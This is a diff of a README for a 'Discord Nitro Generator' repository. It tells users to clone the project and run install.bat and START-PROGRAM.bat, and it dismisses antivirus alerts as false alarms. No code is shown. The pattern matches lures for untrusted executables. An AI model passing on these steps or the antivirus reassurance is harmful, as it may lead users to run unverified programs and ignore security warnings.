@@ -10,14 +10,15 @@ This is an open-source Discord Nitro Generator written in Python! Please Do Not 
 ```
 git clone https://github.com/b4db0y01/Discord-Nitro-Generator-Checker.git
 ```
-Run 
+**Run** 
 ```
 "install.bat"
 ``` 
-
-and you can start
-
-## ⚠ Sometimes the antivirus can detect "suspicious activity" because the program often accesses the discord API (i solve this problem).
+**Then Run the new file**
+``` 
+"START-PROGRAM.bat"
+``` 
+## ⚠ *Sometimes the antivirus can detect "suspicious activity" because the program often accesses the discord API (i solve this problem).*
 
 ##
 Any Issues Please Let Me Know!
